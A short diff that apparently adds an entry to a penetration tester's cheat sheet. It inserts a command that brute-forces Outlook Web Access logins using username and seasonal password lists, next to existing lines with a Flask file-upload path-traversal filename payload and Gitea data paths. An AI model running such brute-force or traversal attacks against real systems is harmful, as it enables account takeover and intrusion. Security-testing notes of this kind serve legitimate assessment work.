@@ -334,6 +334,9 @@ docker-compose.yml
       - /home/developer/gitea/data:/data
         /data/gitea/gitea.db
 
+[*] Outlook (OWA)
+./owabrute.sh -d $DOM -u usernames -p passwords_custom_seasons_5_years
+
 [*] Flask
 -->> File Upload Traversal
 filename="..//app/app/views.py"
